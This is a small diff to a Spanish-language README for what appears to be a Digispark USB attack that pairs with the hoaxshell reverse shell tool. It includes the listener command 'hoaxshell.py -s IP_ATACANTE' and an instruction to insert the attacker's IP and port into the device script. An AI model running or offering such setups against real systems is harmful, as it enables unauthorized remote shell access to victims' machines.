@@ -48,7 +48,7 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 ### 3. Abrir Arduino y seleccionar Digispark 16.5 Board.
 <img width="858" height="131" alt="imagen" src="https://github.com/user-attachments/assets/3de241e0-7181-44e2-aa3a-a96a26e3e4c1" />
 
-### 4. Dentro de Arduino, abrir el archivo .ino que se encuentra en la carpeta script del repositorio y modificar las siguientes variables:
+### 4. Dentro de Arduino, abrir el archivo .ino que se encuentra en la ruta script/script.ino del repositorio y modificar las siguientes variables:
 
 
 - IP_AND_PORT_ATTACKER: Reemplazar por tu IP y puerto de atacante
